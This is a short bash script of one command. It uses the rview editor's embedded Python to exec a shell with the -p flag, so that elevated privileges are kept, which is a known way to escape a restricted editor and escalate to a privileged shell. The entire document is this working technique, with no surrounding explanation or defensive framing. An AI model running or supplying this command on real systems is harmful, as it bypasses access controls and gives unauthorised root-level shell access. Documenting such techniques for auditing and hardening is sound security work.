#!/bin/bash

rview -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

